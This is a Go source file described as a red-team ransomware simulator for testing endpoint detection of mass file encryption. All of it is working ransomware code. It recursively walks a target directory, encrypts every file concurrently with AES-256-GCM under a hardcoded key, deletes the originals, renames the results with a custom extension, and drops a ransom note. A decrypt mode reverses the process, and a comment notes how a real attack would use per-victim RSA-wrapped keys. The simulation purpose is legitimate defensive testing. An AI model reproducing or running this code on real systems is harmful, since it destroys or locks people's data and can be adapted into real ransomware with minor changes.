// ==============================================================================
// 🍯 Zencefil Efendi's Ransomware Simulator (Red Team EDR Tester)
// Description: A highly concurrent file encryptor/decryptor written in Go.
//              Uses AES-256-GCM. Designed to test Blue Team behavioral alerts 
//              for mass file modifications (Ransomware behavior).
// Compile: go build -ldflags "-s -w" -o zencefil_cryptor.exe zencefil_cryptor.go
// ==============================================================================

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

// In a real scenario, this key would be generated per-victim and encrypted with an attacker's RSA Public Key.
// For simulation, we use a hardcoded 32-byte (256-bit) key.
var encryptionKey = []byte("ZencefilEfendiIsWatchingYouNow32") 
const extension = ".zencefil"

func encryptFile(filename string, wg *sync.WaitGroup) {
	defer wg.Done()

	plaintext, err := os.ReadFile(filename)
	if err != nil {
		return
	}

	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return
	}

	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)

	newFilename := filename + extension
	err = os.WriteFile(newFilename, ciphertext, 0644)
	if err == nil {
		os.Remove(filename)
		fmt.Printf("[+] Encrypted: %s\n", newFilename)
	}
}

func decryptFile(filename string, wg *sync.WaitGroup) {
	defer wg.Done()

	ciphertext, err := os.ReadFile(filename)
	if err != nil {
		return
	}

	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return
	}

	nonceSize := aesGCM.NonceSize()
	if len(ciphertext) < nonceSize {
		return
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Printf("[!] Decryption failed for %s. Wrong key?\n", filename)
		return
	}

	newFilename := strings.TrimSuffix(filename, extension)
	err = os.WriteFile(newFilename, plaintext, 0644)
	if err == nil {
		os.Remove(filename)
		fmt.Printf("[+] Decrypted: %s\n", newFilename)
	}
}

func dropRansomNote(targetDir string) {
	note := "==================================================\n🍯 ZENCEFIL EFENDI HAS COMPROMISED THIS SYSTEM\n==================================================\n\nYour files have been encrypted using military-grade AES-256-GCM.\nThis is a Red Team simulation. If this were a real attack, your \ncompany would be facing millions in damages.\n\nCheck your EDR/SIEM. Did it alert on mass file modifications?\n"
	notePath := filepath.Join(targetDir, "READ_ME_ZENCEFIL.txt")
	os.WriteFile(notePath, []byte(note), 0644)
}

func main() {
	fmt.Println("==================================================")
	fmt.Println("🍯 Zencefil Ransomware Simulator (Golang)")
	fmt.Println("==================================================")

	targetDir := flag.String("dir", "", "Target directory to encrypt/decrypt (e.g., C:\\Users\\Public\\Documents)")
	mode := flag.String("mode", "encrypt", "Mode: 'encrypt' or 'decrypt'")
	flag.Parse()

	if *targetDir == "" {
		fmt.Println("[!] Usage: zencefil_cryptor -dir <path> -mode <encrypt|decrypt>")
		return
	}

	var wg sync.WaitGroup

	err := filepath.WalkDir(*targetDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}

		if d.Name() == "READ_ME_ZENCEFIL.txt" {
			return nil
		}

		if *mode == "encrypt" && !strings.HasSuffix(path, extension) {
			wg.Add(1)
			go encryptFile(path, &wg) 
		} else if *mode == "decrypt" && strings.HasSuffix(path, extension) {
			wg.Add(1)
			go decryptFile(path, &wg)
		}
		return nil
	})

	if err != nil {
		fmt.Printf("[!] Error walking directory: %v\n", err)
	}

	wg.Wait() 

	if *mode == "encrypt" {
		dropRansomNote(*targetDir)
		fmt.Println("\n[*] Encryption complete. Ransom note dropped.")
	} else {
		fmt.Println("\n[*] Decryption complete. Welcome back.")
	}
}
